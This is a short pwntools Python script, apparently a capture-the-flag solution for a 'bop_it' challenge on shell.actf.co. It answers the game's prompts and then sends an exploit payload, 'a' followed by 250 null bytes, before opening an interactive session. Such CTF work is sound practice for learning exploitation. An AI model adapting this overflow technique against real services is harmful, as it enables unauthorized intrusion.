from pwn import *
#r = process('./bop_it')
r = remote('shell.actf.co', 20702)
while 1: #ugly, but no python3.8 := available
    act = r.recvline()
    if act == 'Flag it!\n': break
    print ('%r' % act)
    r.sendline(act[0])
r.sendline('a'+'\x00'*250)
r.recvline()
r.interactive()
